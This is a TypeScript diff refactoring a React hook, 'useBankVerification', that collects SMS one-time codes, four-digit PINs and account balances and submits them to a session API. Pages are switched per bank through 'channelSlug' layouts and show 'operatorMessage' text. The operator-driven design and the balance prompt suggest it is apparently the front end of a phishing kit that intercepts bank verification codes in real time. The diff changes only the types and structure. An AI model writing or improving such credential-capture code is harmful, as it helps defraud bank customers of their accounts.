@@ -3,26 +3,78 @@ import { useSessionStatus } from "./use-session-status";
 import { useResendCountdown } from "./use-resend-countdown";
 import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
 import { debugLog } from "../lib/debug";
-import type { BankVerificationProps } from "../types";
+import type { BankVerificationProps, OperatorMessage, ResendState, TransactionDetails, VerificationLayout } from "../types";
 
 const RESEND_COOLDOWN = 60;
 
-function normalizeLayout(slug: string | undefined): string {
+function normalizeLayout(slug: string | undefined): VerificationLayout {
   if (!slug) return "sms";
   if (slug.endsWith("-sms")) return "sms";
   if (slug.endsWith("-pin")) return "pin";
   if (slug.endsWith("-push")) return "push";
   if (slug.endsWith("-balance")) return "balance";
-  return slug;
+  return "sms";
 }
 
+// Typed layout state — discriminated union keyed on `layout`
+type SmsLayoutState = {
+  layout: "sms";
+  bank?: string;
+  transactionDetails?: TransactionDetails;
+  code: string;
+  onCodeChange: (v: string) => void;
+  wrongCode: boolean;
+  expiredCode: boolean;
+  onTryAgain: () => void;
+  onSubmit: () => void;
+  submitting: boolean;
+  canSubmit: boolean;
+  resendState: ResendState;
+  operatorMessage: OperatorMessage | null;
+};
+
+type PinLayoutState = {
+  layout: "pin";
+  bank?: string;
+  transactionDetails?: TransactionDetails;
+  pinValue: string;
+  onPinChange: (v: string) => void;
+  pinMasked: boolean;
+  onPinMaskToggle: () => void;
+  wrongCode: boolean;
+  expiredCode: boolean;
+  onTryAgain: () => void;
+  onSubmit: () => void;
+  submitting: boolean;
+  canSubmit: boolean;
+  resendState: ResendState;
+  operatorMessage: OperatorMessage | null;
+};
+
+type PushLayoutState = {
+  layout: "push";
+  bank?: string;
+  transactionDetails?: TransactionDetails;
+};
+
+type BalanceLayoutState = {
+  layout: "balance";
+  bank?: string;
+  transactionDetails?: TransactionDetails;
+  balance: string;
+  onBalanceChange: (v: string) => void;
+  onSubmit: () => void;
+  submitting: boolean;
+  canSubmit: boolean;
+  operatorMessage: OperatorMessage | null;
+};
+
+export type LayoutState = SmsLayoutState | PinLayoutState | PushLayoutState | BalanceLayoutState;
+
 export interface UseBankVerificationReturn {
-  missingParams: boolean;
-  shouldRenderNull: boolean;
+  layoutState: LayoutState;
   inProgress: boolean;
   awaitingVerification: boolean;
-  baseLayout: string;
-  layoutProps: Record<string, unknown>;
   error: string | null;
 }
 
@@ -56,19 +108,17 @@ export function useBankVerification({
     countdownResetTrigger,
   } = useSessionStatus(apiBase, channelSlug, sessionId, debug);
 
-  const baseLayout = normalizeLayout(verificationLayout);
+  const layout = normalizeLayout(verificationLayout);
+
   const resendFn = useCallback(async () => {
-    if (baseLayout === "pin") {
+    if (layout === "pin") {
       debugLog(debug, "resend OTP", { type: "pin" });
-      await resendOtp(apiBase, channelSlug, sessionId, "pin");
-      debugLog(debug, "resend OTP done", { type: "pin" });
-    } else if (baseLayout === "sms") {
+      await resendOtp(apiBase, channelSlug, sessionId ?? "", "pin");
+    } else if (layout === "sms") {
       debugLog(debug, "resend OTP", { type: "sms" });
-      await resendOtp(apiBase, channelSlug, sessionId, "sms");
-      debugLog(debug, "resend OTP done", { type: "sms" });
+      await resendOtp(apiBase, channelSlug, sessionId ?? "", "sms");
     }
-    // push/balance: no resend, resolve immediately
-  }, [apiBase, channelSlug, sessionId, baseLayout, debug]);
+  }, [apiBase, channelSlug, sessionId, layout, debug]);
 
   const resendState = useResendCountdown(RESEND_COOLDOWN, countdownResetTrigger, resendFn);
 
@@ -96,9 +146,7 @@ export function useBankVerification({
       }
       return;
     }
-    const terminalSuccess = ["success"].includes(status);
-    const terminalDeclined = ["declined", "expired", "blocked"].includes(status);
-    if (terminalSuccess) {
+    if (status === "success") {
       debugLog(debug, "success callback", { sessionId });
       onSuccess?.(sessionId);
       return;
@@ -108,7 +156,7 @@ export function useBankVerification({
       onError?.("invalid");
       return;
     }
-    if (terminalDeclined) {
+    if (status === "declined" || status === "expired" || status === "blocked") {
       debugLog(debug, "declined callback", { sessionId, status });
       onDeclined?.(sessionId, status);
     }
@@ -118,9 +166,9 @@ export function useBankVerification({
     async (codeValue: string) => {
       clearCodeFeedback?.();
       setSubmitting(true);
-      debugLog(debug, "submit OTP", { type: baseLayout, codeLength: codeValue.length });
+      debugLog(debug, "submit OTP", { type: layout, codeLength: codeValue.length });
       try {
-        await submitOtp(apiBase, channelSlug, sessionId, codeValue);
+        await submitOtp(apiBase, channelSlug, sessionId ?? "", codeValue);
         debugLog(debug, "OTP submitted OK");
       } catch (e) {
         const msg = e instanceof Error ? e.message : "Invalid code";
@@ -129,7 +177,7 @@ export function useBankVerification({
         setSubmitting(false);
       }
     },
-    [apiBase, channelSlug, sessionId, clearCodeFeedback, debug, baseLayout]
+    [apiBase, channelSlug, sessionId, clearCodeFeedback, debug, layout]
   );
 
   const handleSubmitBalance = useCallback(
@@ -138,7 +186,7 @@ export function useBankVerification({
       setSubmitting(true);
       debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
       try {
-        await submitBalance(apiBase, channelSlug, sessionId, balanceValue);
+        await submitBalance(apiBase, channelSlug, sessionId ?? "", balanceValue);
         debugLog(debug, "balance submitted OK");
       } catch (e) {
         const msg = e instanceof Error ? e.message : "Failed to submit balance";
@@ -150,71 +198,64 @@ export function useBankVerification({
     [apiBase, channelSlug, sessionId, debug]
   );
 
-  const missingParams = !channelSlug || !sessionId;
-  const terminalSuccess = ["success"].includes(status);
-  const terminalDeclined = ["declined", "expired", "blocked", "invalid"].includes(status);
-  const shouldRenderNull = Boolean(redirectUrl || terminalSuccess || terminalDeclined);
-  const inProgress = ["pending", "awaiting_action"].includes(status);
-  const awaitingVerification = [
-    "awaiting_sms",
-    "awaiting_pin",
-    "awaiting_push",
-    "awaiting_balance",
-  ].includes(status);
+  const inProgress = status === "pending" || status === "awaiting_action";
+  const awaitingVerification =
+    status === "awaiting_sms" ||
+    status === "awaiting_pin" ||
+    status === "awaiting_push" ||
+    status === "awaiting_balance";
 
-  const layoutProps: Record<string, unknown> =
-    baseLayout === "push"
-      ? { bank, transactionDetails }
-      : baseLayout === "balance"
-        ? {
-            bank,
-            transactionDetails,
-            balance,
-            onBalanceChange: setBalance,
-            operatorMessage,
-            onSubmit: () => handleSubmitBalance(balance),
-            submitting,
-            canSubmit: balance.trim().length > 0,
-          }
-        : baseLayout === "pin"
-          ? {
-              bank,
-              transactionDetails,
-              pinValue,
-              onPinChange: setPinValue,
-              pinMasked,
-              onPinMaskToggle: () => setPinMasked((m) => !m),
-              wrongCode,
-              expiredCode,
-              onTryAgain: clearCodeFeedback,
-              operatorMessage,
-              onSubmit: () => handleSubmitOtp(pinValue),
-              submitting,
-              canSubmit: pinValue.replace(/\D/g, "").length === 4,
-              resendState,
-            }
-          : {
-              bank,
-              transactionDetails,
-              code,
-              onCodeChange: setCode,
-              wrongCode,
-              expiredCode,
-              onTryAgain: clearCodeFeedback,
-              operatorMessage,
-              onSubmit: () => handleSubmitOtp(code),
-              submitting,
-              canSubmit: code.replace(/\D/g, "").length >= 6,
-              resendState,
-            };
+  let layoutState: LayoutState;
 
-  return {
-    missingParams,
-    shouldRenderNull,
-    inProgress,
-    awaitingVerification,
-    baseLayout,
-    layoutProps,
-    error,
-  };
+  if (layout === "push") {
+    layoutState = { layout: "push", bank, transactionDetails };
+  } else if (layout === "balance") {
+    layoutState = {
+      layout: "balance",
+      bank,
+      transactionDetails,
+      balance,
+      onBalanceChange: setBalance,
+      onSubmit: () => handleSubmitBalance(balance),
+      submitting,
+      canSubmit: balance.trim().length > 0,
+      operatorMessage,
+    };
+  } else if (layout === "pin") {
+    layoutState = {
+      layout: "pin",
+      bank,
+      transactionDetails,
+      pinValue,
+      onPinChange: setPinValue,
+      pinMasked,
+      onPinMaskToggle: () => setPinMasked((m) => !m),
+      wrongCode,
+      expiredCode,
+      onTryAgain: clearCodeFeedback ?? (() => {}),
+      onSubmit: () => handleSubmitOtp(pinValue),
+      submitting,
+      canSubmit: pinValue.replace(/\D/g, "").length === 4,
+      resendState,
+      operatorMessage,
+    };
+  } else {
+    layoutState = {
+      layout: "sms",
+      bank,
+      transactionDetails,
+      code,
+      onCodeChange: setCode,
+      wrongCode,
+      expiredCode,
+      onTryAgain: clearCodeFeedback ?? (() => {}),
+      onSubmit: () => handleSubmitOtp(code),
+      submitting,
+      canSubmit: code.replace(/\D/g, "").length >= 6,
+      resendState,
+      operatorMessage,
+    };
+  }
+
+  return { layoutState, inProgress, awaitingVerification, error };
 }
